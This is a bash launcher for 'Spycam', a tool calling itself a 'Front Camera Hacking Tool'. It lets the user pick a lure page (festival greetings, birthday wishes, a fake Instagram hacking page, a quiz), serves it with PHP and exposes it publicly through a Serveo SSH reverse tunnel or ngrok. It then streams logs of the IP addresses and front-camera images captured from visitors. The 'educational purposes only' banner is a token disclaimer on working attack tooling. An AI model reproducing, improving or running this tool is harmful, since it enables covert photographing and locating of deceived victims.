#!/bin/bash

clear='\033[0m'
Red='\033[0;31m'
Green='\033[0;32m'
Yellow='\033[0;33m'
Blue='\033[0;34m'
Purple='\033[0;35m'
Cyan='\033[0;36m'
BRed='\033[1;31m'
BGreen='\033[1;32m'
BYellow='\033[1;93m'
BBlue='\033[1;34m'
BPurple='\033[1;35m'
BCyan='\033[1;36m'
BWhite='\033[1;97m'
RedBG='\033[41m'
Bold='\033[1m'

SCRIPT_PATH="$(realpath "$0")"
PORT=8888
HOST="127.0.0.1"
SERVER_DIR="server"
CAPTURE_DIR="$SERVER_DIR/captures"

mkdir -p "$CAPTURE_DIR"
cd "$SERVER_DIR" || exit 1
> ip.log
> image.log
> combined.log

function show_banner() {
  echo -e "${BRed}${Bold}███████╗██████╗ ██╗   ██╗ ██████╗ █████╗ ███╗   ███╗${clear}"
  echo -e "${BGreen}${Bold}██╔════╝██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗████╗ ████║${clear}"
  echo -e "${BYellow}${Bold}███████╗██████╔╝ ╚████╔╝ ██║     ███████║██╔████╔██║${clear}"
  echo -e "${BBlue}${Bold}╚════██║██╔═══╝   ╚██╔╝  ██║     ██╔══██║██║╚██╔╝██║${clear}"
  echo -e "${BPurple}${Bold}███████║██║        ██║   ╚██████╗██║  ██║██║ ╚═╝ ██║${clear}"
  echo -e "${BCyan}${Bold}╚══════╝╚═╝        ╚═╝    ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝${clear}"
  echo -e "\n${BYellow}${Bold}[*]${BWhite}${Bold} 𝙁𝙧𝙤𝙣𝙩 𝘾𝙖𝙢𝙚𝙧𝙖 𝙃𝙖𝙘𝙠𝙞𝙣𝙜 𝙏𝙤𝙤𝙡 𝙈𝙖𝙙𝙚 𝘽𝙮 𝙏𝙚𝙖𝙢 𝙃𝙖𝙘𝙠𝙒𝙞𝙩𝙝𝘿𝙧𝙤𝙞𝙙. ${BYellow}[*]"
  echo -e "[*]${BWhite}${Bold} 𝗧𝗵𝗶𝘀 𝘁𝗼𝗼𝗹 𝗶𝘀 𝗼𝗻𝗹𝘆 𝗳𝗼𝗿 𝗲𝗱𝘂𝗰𝗮𝘁𝗶𝗼𝗻𝗮𝗹 𝗽𝘂𝗿𝗽𝗼𝘀𝗲𝘀. ${BYellow}[*]"
  echo -e "[*]${BWhite}${Bold} 𝗜𝗳 𝘆𝗼𝘂 𝗺𝗶𝘀𝘂𝘀𝗲 𝗶𝘁, 𝘁𝗵𝗲𝗻 𝘆𝗼𝘂 𝘄𝗶𝗹𝗹 𝗯𝗲 𝗿𝗲𝘀𝗽𝗼𝗻𝘀𝗶𝗯𝗹𝗲. ${BYellow}[*]${clear}\n"
  echo -e "${BGreen}${Bold}╔═══════════════════════════╗"
  echo -e "║Author   : blackhat_abhi   ║"
  echo -e "║GitHub   : BlackHat-Abhi   ║"
  echo -e "║Telegram : HackWithDroid   ║"
  echo -e "║Version  :   1.0.0         ║"
  echo -e "╚═══════════════════════════╝${clear}\n"
}

while true; do
  clear
  show_banner
  echo -e "${BCyan}${Bold}==============================="
  echo -e "     🎯 Select Attack Page"
  echo -e "===============================${clear}"
  for i in {1..10}; do
    case $i in
      1) label="𝗦𝘂𝗿𝗽𝗿𝗶𝘀𝗲 𝗣𝗮𝗴𝗲" ;;
      2) label="𝗛𝗮𝗽𝗽𝘆 𝗛𝗼𝗹𝗶" ;;
      3) label="𝗛𝗮𝗽𝗽𝘆 𝗗𝗶𝘄𝗮𝗹𝗶" ;;
      4) label="𝗙𝗮𝗸𝗲 𝗜𝗻𝘀𝘁𝗮𝗴𝗿𝗮𝗺 𝗛𝗮𝗰𝗸𝗶𝗻𝗴 𝗣𝗮𝗴𝗲" ;;
      5) label="𝗙𝗮𝗸𝗲 𝗦𝗼𝗰𝗶𝗮𝗹 𝗠𝗲𝗱𝗶𝗮 𝗛𝗮𝗰𝗸𝗶𝗻𝗴 𝗣𝗮𝗴𝗲" ;;
      6) label="𝗟𝗶𝘃𝗲 𝗬𝗼𝘂𝗧𝘂𝗯𝗲 𝗠𝗲𝗲𝘁𝗶𝗻𝗴" ;;
      7) label="𝗛𝗮𝗽𝗽𝘆 𝗕𝗶𝗿𝘁𝗵𝗱𝗮𝘆" ;;
      8) label="𝗤𝘂𝗶𝘇 𝗚𝗮𝗺𝗲" ;;
      9) label="𝗛𝗮𝗽𝗽𝘆 𝗩𝗲𝗹𝗻𝘁𝗮𝗶𝗻 𝗗𝗮𝘆" ;;
      10) label="𝗛𝗮𝗽𝗽𝘆 𝗡𝗲𝘄 𝗬𝗲𝗮𝗿" ;;
    esac
    echo -e "${BRed}[ $i ] ${BYellow}${Bold}$label${clear}"
  done
  echo -e "${BWhite}${Bold}[ 11 ] 𝘾𝙤𝙣𝙩𝙚𝙘𝙩 𝙐𝙨${clear}"
  echo -e "${BRed}${Bold}[ 00 ] 𝙀𝙭𝙞𝙩${clear}"
  read -p $'\n[*] 𝗖𝗵𝗼𝗼𝘀𝗲 𝗼𝗽𝘁𝗶𝗼𝗻 ➤ ' page_opt

  case "$page_opt" in
    1) PAGE="surprise.php"; break ;;
    2) PAGE="holi.php"; break ;;
    3) PAGE="diwali.php"; break ;;
    4) PAGE="instagram.php"; break ;;
    5) PAGE="socail.php"; break ;;
    6) PAGE="youtube.php"; break ;;
    7) PAGE="birthday.php"; break ;;
    8) PAGE="quiz.php"; break ;;
    9) PAGE="velntain.php"; break ;;
    10) PAGE="newyear.php"; break ;;
    11)
      while true; do
        clear
        show_banner
        echo -e "${Yellow}${Bold}========== CONTACT US ==========${clear}"
        echo -e "${BBlue}${Bold}[ 1 ] Instagram"
        echo -e "[ 2 ] Telegram"
        echo -e "[ 3 ] GitHub"
        echo -e "[ 4 ] YouTube"
        echo -e "${BRed}${Bold}[ 99 ] Back to Main Menu${clear}"
        read -p $'\n[*] Choose option: ' contact_opt
        case "$contact_opt" in
          1) xdg-open "https://instagram.com/blackhat_abhi" ;;
          2) xdg-open "https://telegram.me/hackwithdroid" ;;
          3) xdg-open "https://github.com/BlackHat-Abhi" ;;
          4) xdg-open "https://youtube.com/@hackwithdroid" ;;
          99) exec "$SCRIPT_PATH" ;;
          *) echo -e "${Red}[!] Invalid contact option.${clear}" && sleep 1 ;;
        esac
      done ;;
    00)
      echo -e "${Red}[!] Exiting...${clear}"
      exit 0 ;;
    *) echo -e "${Red}[!] Invalid option.${clear}" && sleep 1 ;;
  esac
done

rm -f index.php
ln -s "$PAGE" index.php

php -S $HOST:$PORT > /dev/null 2>&1 &
PHP_PID=$!
sleep 2

while true; do
  clear
  show_banner
  echo -e "${Purple}${Bold}============================"
  echo -e "   🌐 Tunnel Method"
  echo -e "============================${clear}"
  echo -e "${BGreen}[ 1 ] Localhost"
  echo -e "[ 2 ] Serveo"
  echo -e "[ 3 ] Setup Ngrok"
  echo -e "${BRed}[ 99 ] Back to Main Menu"
  echo -e "[ 00 ] Exit${clear}"
  read -p $'\n[*] 𝗖𝗵𝗼𝗼𝘀𝗲 𝗼𝗽𝘁𝗶𝗼𝗻 ➤ ' opt

  case "$opt" in
    1)
      echo -e "${Green}[+] Localhost: http://$HOST:$PORT${clear}"
      echo -e "${BCyan}[*] Images saved to: captures/${clear}"
      trap "rm -f index.php; kill $PHP_PID" EXIT
      break ;;
    2)
      echo -e "${Yellow}[*] Starting Serveo tunnel...${clear}"
      ssh -o StrictHostKeyChecking=no -R 80:localhost:$PORT serveo.net > serveo.log 2>&1 &
      SSH_PID=$!
      echo -n "[*] Waiting for Serveo link"
      while true; do
        link=$(grep -o 'https://[a-zA-Z0-9.-]*serveo.net' serveo.log | head -n1)
        [[ -n "$link" ]] && break
        echo -n "."
        sleep 1
      done
      echo -e "\n${BGreen}[+] Serveo URL: $link${clear}"
      command -v termux-clipboard-set >/dev/null && termux-clipboard-set "$link"
      trap "rm -f index.php; kill $PHP_PID $SSH_PID; rm serveo.log" EXIT
      break ;;
    3)
      echo -e "${Cyan}[*] Ngrok setup...${clear}"
      if [[ "$PREFIX" == *"com.termux"* ]]; then
        echo -e "${Yellow}[Termux detected]${clear}"
        NGROK_PATH="/data/data/com.termux/files/usr/bin/ngrok"
        CONFIG_PATH="/data/data/com.termux/files/home/.config/ngrok/ngrok.yml"
        if [[ ! -f "$NGROK_PATH" ]]; then
          wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz
          tar -xvf ngrok-v3-stable-linux-arm64.tgz
          chmod 777 ngrok
          mv ngrok "$NGROK_PATH"
        fi
      else
        echo -e "${Yellow}[Linux system detected]${clear}"
        NGROK_PATH="/usr/local/bin/ngrok"
        CONFIG_PATH="/root/.config/ngrok/ngrok.yml"
        if [[ ! -f "$NGROK_PATH" ]]; then
          apt install wget -y
          wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
          tar -xvf ngrok-v3-stable-linux-amd64.tgz
          chmod 777 ngrok
          mv ngrok "$NGROK_PATH"
        fi
      fi
      if [[ ! -f "$CONFIG_PATH" ]]; then
        read -p "[+] Enter your Ngrok Authtoken: " TOKEN
        "$NGROK_PATH" config add-authtoken "$TOKEN"
      fi
      echo -e "${Green}[✔] Ngrok setup complete!${clear}"
      echo -e "${Yellow}[⚠] Open a new terminal and run: ngrok http $PORT${clear}"
      echo -e "${BCyan}[*] Localhost: http://$HOST:$PORT${clear}"
      trap "rm -f index.php; kill $PHP_PID" EXIT
      break ;;
    99)
      exec "$SCRIPT_PATH" ;;
    00)
      echo -e "${Red}[!] Exiting...${clear}"
      kill $PHP_PID 2>/dev/null
      exit 0 ;;
    *)
      echo -e "${Red}[!] Invalid tunnel option.${clear}" && sleep 1 ;;
  esac
done

# ========== LOG STREAM ==========
echo -e "\n${BYellow}${Bold}[*] Watching logs (Ctrl+C to stop)...${clear}\n"
tail -n0 -F combined.log | while read line; do
  if [[ $line == *"IP:"* ]]; then
    echo -e "${BCyan}${Bold}$line${clear}"
  elif [[ $line == *"image"* ]]; then
    echo -e "${BCyan}${Bold}$line${clear}"
  else
    echo "$line"
  fi
done
